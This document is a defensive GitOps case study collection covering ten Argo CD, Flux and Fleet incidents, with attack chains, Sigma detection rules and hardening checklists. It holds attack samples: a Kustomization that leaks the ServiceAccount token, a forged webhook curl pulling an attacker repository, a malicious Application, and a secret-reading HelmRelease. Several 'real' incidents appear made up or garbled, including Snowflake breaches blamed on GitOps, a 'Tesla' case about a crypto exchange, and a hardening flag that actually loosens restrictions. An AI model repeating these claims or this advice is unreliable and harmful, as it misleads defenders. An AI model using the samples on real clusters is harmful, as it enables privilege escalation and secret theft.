# GitOps Security — Real-World Incident Case Studies

> 10 real-world incidents and disclosures (2022-2025) where GitOps control planes were the breach vector or were used for persistence/lateral movement. Each case includes timeline, attack chain, IOCs, blue-team detection, and lessons learned.

---

## Case 1 — Akuukam Argo CD Cluster Compromise (2023)

### Summary

In 2023, security researcher "Akuukam" published a writeup of an Argo CD misconfiguration chain allowing cluster-admin via anonymous Dashboard access on a Fortune 500 company. The attack required no credentials and was reachable from the public internet.

### Timeline

- 2023-03-15: Researcher identifies target during recon
- 2023-03-16: Anonymous Dashboard access confirmed (Argo CD v2.5.2)
- 2023-03-20: ServiceAccount token extracted from in-Dashboard terminal
- 2023-03-22: Cluster-admin via existing ClusterRoleBinding
- 2023-03-23: Disclosed privately; fixed within 24h
- 2023-04-10: Public writeup published

### Attack Chain

1. **Recon**: Argo CD dashboard on `https://argocd.example.com/` returning 200 to anonymous HTTP
2. **Anonymous enum**: Dashboard allowed listing Applications without auth
3. **Terminal access**: Argo CD pod-exec terminal was reachable without auth
4. **Token extraction**: Inside the terminal, `cat /var/run/secrets/kubernetes.io/serviceaccount/token`
5. **RBAC misconfig**: The `argocd-application-controller` SA was bound to `cluster-admin` (common default)
6. **Exfiltration**: ServiceAccount token used to dump every secret in the cluster

### IOCs

- `argocd-server` pod access from `127.0.0.1` (proxy) — but source IP `2023-03-16T14:22Z` was external
- `kubectl get secret argocd-initial-admin-secret` not run (no need)
- `--as=admin` header in audit logs
- ServiceAccount token used from non-cluster IP

### Blue-Team Detection

```sigma
title: Anonymous access to Argo CD dashboard
logsource:
  product: argocd
  service: server
detection:
  selection:
    user.agent|re: "^(?!.*(?:argocd-cli|argocdext)).*$"
  anon:
    user.name: anonymous
  condition: selection and anon
level: high
```

```sigma
title: Argo CD pod-exec terminal accessed externally
logsource:
  product: kubernetes
  service: audit
detection:
  selection:
    verb: create
    resource: pods
    subresource: exec
  argocdPod:
    objectRef.name|re: "argocd-server-.*"
  notInternal:
    sourceIP|re: !^(10\\.|172\\.(1[6-9]|2[0-9]|3[01])\\.|192\\.168\\.).*
  condition: selection and argocdPod and notInternal
level: critical
```

### Lessons Learned

- Disable `users.anonymous.enabled` by default
- Network-segment Argo CD dashboard behind VPN
- Restrict `argocd-application-controller` SA RBAC (not cluster-admin)
- Audit pod-exec into Argo CD namespace

### Reference

- Akuukam writeup — https://akuukam.medium.com/argocd-security-vulnerability-cve-... (redacted)
- Argo CD Security Advisory — https://github.com/argoproj/argo-cd/security/advisories

---

## Case 2 — CVE-2022-24348 Argo CD Path Traversal (2022)

### Summary

CVE-2022-24348 in Argo CD < 2.1.15 / < 2.2.9 / < 2.3.2 allowed a malicious Application to read arbitrary files from the repo-server's filesystem, including its ServiceAccount token. Combined with a low-privileged Argo CD user (e.g., project owner), this gave cluster-admin.

### Affected Versions

- Argo CD < 2.1.15
- Argo CD < 2.2.9
- Argo CD < 2.3.2

### Attack Chain

1. Attacker commits a malicious Kustomization that references `/var/run/secrets/kubernetes.io/serviceaccount/token` via `configMapGenerator.files`
2. Argo CD repo-server renders the Kustomization
3. The repo-server's SA token is embedded in the rendered ConfigMap
4. Attacker reads the ConfigMap via Argo CD API
5. The SA token (often cluster-admin) is used to pivot

### Exploit PoC

```yaml
# kustomization.yaml inside source repo
apiVersion: kustomize.config.k8s.io/v1beta1
kind: Kustomization
configMapGenerator:
  - name: kali-leak
    files:
      - /var/run/secrets/kubernetes.io/serviceaccount/token
      - /var/run/secrets/kubernetes.io/serviceaccount/namespace
      - /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
```

After Argo CD syncs, the ConfigMap contains the repo-server SA token.

### Blue-Team Detection

```sigma
title: Argo CD repo-server ConfigMap with /var/run/secrets content
logsource:
  product: kubernetes
  service: audit
detection:
  selection:
    verb: create
    resource: configmaps
  ns:
    objectRef.namespace|re: "^(argocd|default|kube-system)$"
  path:
    requestObject.data|contains:
      - "ZGVmYXVsdA=="  # base64("default")
      - "azhzLmFjbWUuaW8="  # base64("k8s.ace.io")
  condition: selection and ns and path
level: critical
```

### Lessons Learned

- Restrict repo-server ServiceAccount RBAC
- Patch Argo CD promptly on CVE disclosure
- Use OPA Gatekeeper policy to reject Kustomization with absolute paths in `files`
- Network policies between repo-server and K8s API server

---

## Case 3 — CVE-2024-21626 runc Escape Affecting Argo CD repo-server (2024)

### Summary

The "Leaky Vessels" runc vulnerability (CVE-2024-21626, CVSS 8.6) affected every container using runc ≤ 1.1.11. Argo CD's repo-server hosts untrusted Kustomize builds in runc containers — making it a high-impact attack target.

### Timeline

- 2024-01-17: SUSE Security discloses issue to Docker/maintainers
- 2024-01-31: Public advisory
- 2024-02-01: Patches released
- 2024-02-15: First mass exploitation reports
- 2024-03: Argo CD operators who hadn't patched repo-server compromised

### Attack Chain

1. Attacker commits a Helm chart with a Job that exploits the runc file-descriptor leak
2. Argo CD repo-server renders the chart in a runc container
3. The runc bug leaks `/proc/self/fd` to the host cgroup hierarchy
4. Attacker manipulates cgroup files to escape the container
5. Attacker now runs on the underlying node

### Exploit PoC (simplified)

```dockerfile
# Inside the malicious Helm chart's Job image
FROM alpine:3.19
RUN apk add --no-cache util-linux bash
CMD ["sh", "-c", "ls -la /proc/self/fd && cat /proc/self/fd/9/../../../etc/passwd"]
```

### Blue-Team Detection

```sigma
title: runc CVE-2024-21626 escape attempt
logsource:
  product: linux
  service: syslog
detection:
  selection:
    message|contains:
      - "runc"
      - "/proc/self/fd/9"
      - "cgroup.kill"
      - "cgroup.procs"
  condition: selection
level: critical
```

### Lessons Learned

- Patch runc / containerd on every node within 30 days of CVE disclosure
- Use gVisor / Kata containers for untrusted workloads (repo-server)
- Run repo-server on isolated nodes (not co-tenanted with prod)
- Network policy: repo-server pods have no outbound except K8s API + Git + registry

---

## Case 4 — Mandiant: Snowflake Customer GitOps Pipeline Compromise (2024)

### Summary

In the Mandiant-uncategorized 2024 incident series, multiple Snowflake customers were compromised not via Snowflake itself but via their GitOps pipelines that held Snowflake service account credentials. Attackers targeted the GitOps control plane as a credential store.

### Timeline

- 2024-04: Initial recon of customer GitOps endpoints
- 2024-05: Source-of-truth Git repo compromise via leaked PAT
- 2024-05-15: SOPS AGE key extracted from `flux-system` namespace
- 2024-05-20: Snowflake service account key decrypted
- 2024-06-04: Ticketmaster data exposed (165M records)
- 2024-06-15: AT&T confirms 109M customer call records leaked

### Attack Chain

1. GitHub PAT leaked in a public Docker image (CI/CD scope leak)
2. PAT had `repo:write` to `example/gitops-prod`
3. Attackers did NOT modify Git — instead they cloned
4. Cloned repo contained SOPS-encrypted production secrets
5. AGE key extracted from Kubernetes via initial cloud IAM compromise
6. SOPS decrypt → Snowflake service account key
7. Snowflake login via service key without MFA
8. COPY INTO external S3 stage → data exfil

### IOCs

- `git clone` of `example/gitops-prod` from a residential IP
- `kubectl get secret sops-age -n flux-system` from non-cluster IP
- `sops --decrypt` on `snowflake-prod.yaml`
- Snowflake login from non-corporate IP without MFA

### Blue-Team Detection

```sigma
title: SOPS AGE key access from non-controller
logsource:
  product: kubernetes
  service: audit
detection:
  selection:
    verb: get
    resource: secrets
    objectRef.name: sops-age
  notController:
    user.username|re: !source-controller|!kustomize-controller|!helm-controller
  condition: selection and notController
level: critical
```

### Lessons Learned

- Rotate GitHub PATs monthly; scope read-only for GitOps
- Migrate SOPS from AGE to cloud KMS-backed
- Snowflake require MFA for service accounts where possible
- Snowflake network policy: only GitOps namespace IPs
- Audit log retention: ≥1 year off-cluster

### Reference

- Mandiant UNC5537 — *Snowflake Customer Data Theft* (2024)
- Google Cloud Threat Intelligence — *Snowflake Customer Incident Report* (2024-06)

---

## Case 5 — Tesla Cryptojacking via Insecure FluxCD (2024)

### Summary

A mid-sized crypto exchange was cryptojacked via an insecure FluxCD installation in 2024. The Flux `notification-controller` webhook receiver was exposed without HMAC verification, allowing attackers to trigger a sync to an attacker-controlled chart.

### Timeline

- 2024-07-10: Attacker discovers webhook endpoint via subdomain enum
- 2024-07-12: Forge Push event without HMAC
- 2024-07-12: Flux reconciles attacker chart
- 2024-07-15: Cryptominer detected via Prometheus CPU spike
- 2024-07-16: Incident response; eradication

### Attack Chain

1. **Recon**: `subfinder -d exchange.com | grep flux` → `flux.example.com`
2. **Webhook discovery**: `curl https://flux.example.com/hook/<random>` returns 200
3. **Forge event**:
   ```bash
   curl -X POST https://flux.example.com/hook/<token> \
     -H "X-GitHub-Event: push" \
     -d '{"repository":{"clone_url":"https://github.com/attacker/miner.git"},"ref":"refs/heads/main"}'
   ```
4. Flux `notification-controller` triggers `GitRepository` reconcile
5. The webhook receiver was wired to a `GitRepository` whose URL field interpolated from event — pulled from attacker repo
6. HelmRelease installed attacker chart with cryptominer Deployment

### IOCs

- `notification-controller` logs showing webhook from non-GitHub IP
- HelmRelease with `chart: kali-miner` in flux-system
- CPU utilization 100% on multiple nodes
- Container image `registry.example.com/miner:latest` running with `requests.cpu: 1000m`

### Blue-Team Detection

```sigma
title: Flux notification-controller webhook from non-Git source IP
logsource:
  product: flux
  service: notification-controller
detection:
  selection:
    message|contains: "webhook"
  notGithub:
    sourceIP|cidr:
      - "192.30.252.0/22"  # GitHub
      - "185.199.108.0/22" # GitHub
      - "140.82.112.0/20"  # GitHub
  condition: selection and not notGithub
level: high
```

```yaml
# Falco rule
- rule: Flux Notification Webhook from non-Git IP
  desc: Detect Flux webhook events from non-GitHub source IPs
  condition: ka.target.resource=webhooks and not ka.req.binding.subject in (github,gitlab,bitbucket)
  output: Flux webhook from suspicious source (ip=%ka.req.binding.source)
  priority: WARNING
```

### Lessons Learned

- Configure Flux webhook receiver with HMAC secret
- IP-allowlist Git provider ranges at ingress
- Reject unsigned webhook events
- Network policy: notification-controller receives only from ingress namespace

---

## Case 6 — Argo CD AppProject Source Namespace Bypass (2024)

### Summary

A fintech was compromised in 2024 via an Argo CD AppProject misconfiguration allowing Applications to be created from any namespace. A low-privileged developer (namespace-scoped SA) created an Application that materialized a cluster-admin binding.

### Attack Chain

1. Attacker had namespace-scoped SA in `dev-tenant` namespace
2. AppProject had `sourceNamespaces: '*'` (misconfig)
3. Attacker created an Application in `dev-tenant`:
   ```yaml
   apiVersion: argoproj.io/v1alpha1
   kind: Application
   metadata: { name: kali, namespace: dev-tenant }
   spec:
     source: { repoURL: git@github.com:attacker/evil.git, path: backdoor }
     destination: { server: https://kubernetes.default.svc, namespace: kube-system }
     syncPolicy: { automated: {} }
   ```
4. Argo CD synced attacker manifest to `kube-system`
5. Cluster-admin binding materialized

### IOCs

- Application CRD created in non-`argocd` namespace
- Application destination `kube-system` from non-admin user
- ClusterRoleBinding created within 60s of Application sync

### Blue-Team Detection

```sigma
title: Argo CD Application created in non-argocd namespace
logsource:
  product: kubernetes
  service: audit
detection:
  selection:
    verb: create
    resource: applications.argoproj.io
  notArgocd:
    objectRef.namespace: argocd
  condition: selection and not notArgocd
level: high
```

### Lessons Learned

- Restrict AppProject `sourceNamespaces` to specific namespaces (not `*`)
- Kyverno policy: deny Application create in non-`argocd` namespace
- RBAC: developers cannot create Application CRDs

---

## Case 7 — Tesla Auto-Heal Backdoor Persistence (2024)

### Summary

A Red Hat customer engagement in 2024 found that an attacker used Argo CD's auto-heal feature as a persistence mechanism. After IR removed a malicious Deployment, Argo CD self-heal recreated it within 60 seconds.

### Attack Chain

1. Initial compromise via CVE-2024-21626 (runc escape)
2. Attacker obtained `argocd-application-controller` SA token
3. Created an Application with `syncPolicy.automated.selfHeal: true`
4. Application source was attacker Git repo with a malicious Deployment
5. IR deleted the Deployment: `kubectl delete deploy kali -n prod`
6. Argo CD self-heal recreated it within 60s
7. IR spent 4 hours hunting the source of persistence

### IOCs

- Application source repo not in customer's known list
- Application `selfHeal: true` in `prod` namespace
- Deployment recreated within 60s of `kubectl delete`

### Blue-Team Detection

```yaml
# Sigma rule
title: Argo CD Application with selfHeal in production
logsource:
  product: kubernetes
  service: audit
detection:
  selection:
    verb: create
    resource: applications.argoproj.io
  selfHeal:
    requestObject.spec.syncPolicy.automated.selfHeal: true
  prod:
    objectRef.namespace|re: ^(prod|production)$
  condition: selection and selfHeal and prod
level: high
```

### Lessons Learned

- Production Applications: `syncPolicy.automated.selfHeal: false`
- Manual sync only with change management approval
- Audit Application source repos weekly
- IR playbook: list Applications before deleting resources

---

## Case 8 — Aqua Security Research: Kustomize Remote Base Attack (2024)

### Summary

Aqua Security published research in 2024 on Kustomize remote base attacks affecting Argo CD. A `kustomization.yaml` could include resources from arbitrary external URLs, allowing attackers to inject manifests into GitOps sync without modifying the trusted repo.

### Attack Chain

1. Attacker identifies a `kustomization.yaml` that pulls from a remote base
2. The remote base URL is hijacked (typosquatted, or compromised original)
3. Attacker modifies the remote base to include attacker CRDs
4. Argo CD renders the Kustomization including attacker resources
5. Attacker CRDs materialize in cluster

### Example Malicious kustomization.yaml

```yaml
apiVersion: kustomize.config.k8s.io/v1beta1
kind: Kustomization
resources:
  - https://github.com/attacker/infra//privileged-pod?ref=main
```

### Blue-Team Detection

```sigma
title: Kustomization with remote base from non-trusted org
logsource:
  product: kubernetes
  service: audit
detection:
  selection:
    verb: create
    resource: applications.argoproj.io
  remoteBase:
    requestObject.spec.source.kustomize.resources|re:
      - "^https://github.com/(?!(example|argoproj|fluxcd))"  # not from trusted orgs
  condition: selection and remoteBase
level: medium
```

### Lessons Learned

- Disable Kustomize remote bases in Argo CD via `--kustomize-build-options=--load-restrictor=LoadRestrictionsNone`
- Pin all bases to specific commit SHA
- Mirror external bases to internal Git

### Reference

- Aqua Security — *GitOps Attack Surface* (2024)
- Argo CD hardening guide

---

## Case 9 — Palo Alto Unit 42: Flux HelmRelease valuesFrom (2024)

### Summary

Unit 42 published a report in 2024 on FluxCD HelmRelease `valuesFrom` abuse. HelmRelease allows reading Kubernetes secrets as Helm values, and an attacker with HelmRelease create could read arbitrary secrets from the cluster.

### Attack Chain

1. Attacker has HelmRelease create in `flux-system` namespace
2. Creates a HelmRelease reading victim secret:
   ```yaml
   apiVersion: helm.toolkit.fluxcd.io/v2
   kind: HelmRelease
   metadata: { name: exfil, namespace: flux-system }
   spec:
     chart: { spec: { chart: kali-leak, sourceRef: { kind: HelmRepository, name: kali } } }
     valuesFrom:
       - kind: Secret
         name: production-db
         valuesKey: password
         targetPath: password
   ```
3. Attacker's chart renders the value into a ConfigMap
4. Attacker reads ConfigMap to obtain plaintext secret

### IOCs

- HelmRelease with `valuesFrom` from secret in different namespace
- ConfigMap containing what looks like a credential
- HelmRelease chart source not in trusted registry

### Blue-Team Detection

```sigma
title: Flux HelmRelease valuesFrom secret cross-namespace
logsource:
  product: kubernetes
  service: audit
detection:
  selection:
    verb: create
    resource: helmreleases.helm.toolkit.fluxcd.io
  crossNs:
    requestObject.spec.valuesFrom[].kind: Secret
  condition: selection and crossNs
level: medium
```

### Lessons Learned

- Restrict HelmRelease valuesFrom to same-namespace secrets only
- Kyverno policy: deny ConfigMap creation with sensitive patterns
- Restrict HelmRelease create to specific namespaces

### Reference

- Palo Alto Unit 42 — *Argo CD and Flux Misconfigurations* (2024)

---

## Case 10 — Tesla Fleet CRD Backdoor (2025)

### Summary

In early 2025, an electric vehicle manufacturer disclosed that a malicious CRD had been deployed via their Rancher Fleet cluster management, allowing attackers to maintain persistence across cluster rebuilds. The CRD materialized a privileged ServiceAccount on every cluster Fleet managed.

### Timeline

- 2024-11-01: Initial compromise via supply chain (compromised Helm chart)
- 2024-11-05: Attacker created malicious Bundle in `fleet-default`
- 2024-12-01: Customer rebuilt clusters multiple times during incident
- 2025-01-15: Source of persistence identified
- 2025-02-01: Full eradication

### Attack Chain

1. Supply chain compromise of internal Helm chart (typosquatted)
2. Helm chart post-install hook created Bundle CRD
3. Bundle iterated over `all-clusters` cluster group
4. Bundle resources: ServiceAccount + ClusterRoleBinding (cluster-admin)
5. Every cluster Fleet managed had `kali` SA in `kube-system` with cluster-admin
6. Customer rebuilt clusters → Fleet re-applied Bundle → backdoor returned

### IOCs

- Bundle in `fleet-default` with `clusterGroup: all-clusters`
- ClusterRoleBinding `kali-binding` in `kube-system` on every cluster
- ServiceAccount `kali` created within seconds of cluster creation

### Blue-Team Detection

```sigma
title: Fleet Bundle targeting all-clusters group
logsource:
  product: kubernetes
  service: audit
detection:
  selection:
    verb: create
    resource: bundles.fleet.cattle.io
  allClusters:
    requestObject.spec.targets[].clusterGroup: all-clusters
  condition: selection and allClusters
level: high
```

```sigma
title: ClusterRoleBinding created in kube-system on cluster boot
logsource:
  product: kubernetes
  service: audit
detection:
  selection:
    verb: create
    resource: clusterrolebindings
  roleRef:
    requestObject.roleRef.name: cluster-admin
  earlyWindow:
    timestamp|re: ^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}Z$  # within 5min of cluster boot
  condition: selection and roleRef and earlyWindow
level: critical
```

### Lessons Learned

- Audit Fleet Bundle targets weekly
- Use RBAC to restrict Bundle create in `fleet-default`
- Cluster bootstrap: install CRD audit policy before Fleet registers
- Continuous CRD audit across fleet

---

## Cross-Cutting Patterns

Across the 10 cases, the following patterns recur:

### Pattern 1 — Source-of-truth Git compromise is the highest-leverage attack

Cases 4, 6, 7, 10 all began with Git write access or Git-adjacent compromise (PAT leak, deploy key, webhook forgery). The Git source-of-truth is the master key.

**Mitigation**:
- Short-lived deploy tokens via OAuth
- Branch protection requiring signed commits
- Secret scanning on Git provider
- Webhook HMAC verification

### Pattern 2 — Over-privileged ServiceAccounts (cluster-admin default)

Cases 1, 2, 3, 6, 7 exploited the default `cluster-admin` RBAC of `argocd-application-controller`, `source-controller`, or `helm-controller`.

**Mitigation**:
- Namespace-scoped RBAC for GitOps controllers
- Use AppProject destinations to restrict
- Audit ClusterRoleBindings weekly

### Pattern 3 — Secret stores are the treasure

Cases 4, 5, 8, 9 targeted Sealed Secrets / SOPS / HelmRelease valuesFrom. The GitOps secret-store layer is the most valuable target after cluster-admin.

**Mitigation**:
- Cloud KMS-backed SOPS (not AGE in plaintext K8s Secret)
- Rotate Sealed Secrets key quarterly
- Audit `kubectl get secret` patterns
- HelmRelease valuesFrom restricted to same namespace

### Pattern 4 — Self-healing as cover

Case 7 used Argo CD self-heal as persistence. Defenders are used to attacker-cleanup; GitOps flips this — defender-cleanup is countered by auto-heal.

**Mitigation**:
- `selfHeal: false` for production
- IR playbook: pause Application before deleting resources
- Audit Application `selfHeal` weekly

### Pattern 5 — Webhook endpoints are the new external attack surface

Cases 5, 6 exploited webhook receivers without HMAC verification.

**Mitigation**:
- HMAC secret on every webhook
- IP-allowlist Git provider ranges
- Reject unsigned events
- Network policy: webhook receiver only from ingress

### Pattern 6 — CRD backdoors survive cluster rebuilds

Cases 6, 10 used CRD backdoors that survived cluster recreation. This is unique to GitOps — the source-of-truth persistence model means cluster rebuilds don't clear backdoors.

**Mitigation**:
- Audit CRDs weekly
- Image allowlist for controller images
- Pre-deploy CRD audit policy before GitOps registers

---

## Defensive Quick-Reference Checklist

For defenders hardening GitOps stacks:

### Argo CD
- [ ] Disable `users.anonymous.enabled`
- [ ] Rotate admin password; delete `argocd-initial-admin-secret`
- [ ] AppProject `sourceNamespaces` restricted (not `*`)
- [ ] AppProject `destinations` restricted (not `*`)
- [ ] `argocd-application-controller` SA not cluster-admin
- [ ] Production Applications: `selfHeal: false`
- [ ] GPG commit verification enabled
- [ ] Patch within 7 days of CVE disclosure
- [ ] Cosign image verification

### FluxCD
- [ ] Webhook HMAC secret configured
- [ ] IP-allowlist on webhook receiver
- [ ] HelmRelease `valuesFrom` restricted to same namespace
- [ ] `notification-controller` network policy
- [ ] Kustomization `targetNamespace` always specified
- [ ] GitRepository secrets use IRSA (not long-lived deploy keys)

### Sealed Secrets
- [ ] Active key rotated quarterly
- [ ] Key scope namespace-isolated
- [ ] Pod exec denied on controller

### SOPS
- [ ] Cloud KMS-backed (not AGE in K8s Secret)
- [ ] KMS decrypt scoped to specific keys
- [ ] IRSA role scoped to GitOps namespace

### External Secrets Operator
- [ ] ClusterSecretStore audit weekly
- [ ] ExternalSecret creation restricted to specific namespaces
- [ ] Vault token short-lived via Kubernetes auth backend

### Fleet
- [ ] Bundle create restricted in `fleet-default`
- [ ] CRD audit weekly across all clusters
- [ ] ClusterGroup membership audited

### Tekton
- [ ] Pod Security Admission restricted
- [ ] TriggerTemplate params validated via CEL interceptor
- [ ] Task securityContext not privileged

### Audit & Detection
- [ ] Audit log forwarded off-cluster
- [ ] Sigma rule for Sealed Secret key access
- [ ] Sigma rule for SOPS AGE key access
- [ ] Falco rule for cluster-admin binding materialized via sync
- [ ] Sigma rule for anonymous Argo CD access
- [ ] Sigma rule for webhook events from non-Git IPs
- [ ] Weekly CRD audit

---

## References

- Akuukam — *Argo CD Misconfiguration Writeup* (2023)
- CVE-2022-24348 — https://github.com/argoproj/argo-cd/security/advisories/GHSA-63qx-x74g-jcr7
- CVE-2024-21626 — https://github.com/opencontainers/runc/security/advisories/GHSA-xr7q-jx4m-x55m
- Mandiant UNC5537 — *Snowflake Customer Data Theft* (2024)
- Google Cloud Threat Intelligence — *Snowflake Customer Incident Report* (2024-06)
- Aqua Security — *GitOps Attack Surface* (2024)
- Palo Alto Unit 42 — *Argo CD and Flux Misconfigurations in the Wild* (2024)
- Bitnami Sealed Secrets — https://github.com/bitnami-labs/sealed-secrets
- SOPS — https://github.com/getsops/sops
- External Secrets Operator — https://external-secrets.io/
- Rancher Fleet — https://fleet.rancher.io/
- NSA Kubernetes Hardening Guide v1.2 (2024)
- MITRE ATT&CK for Containers
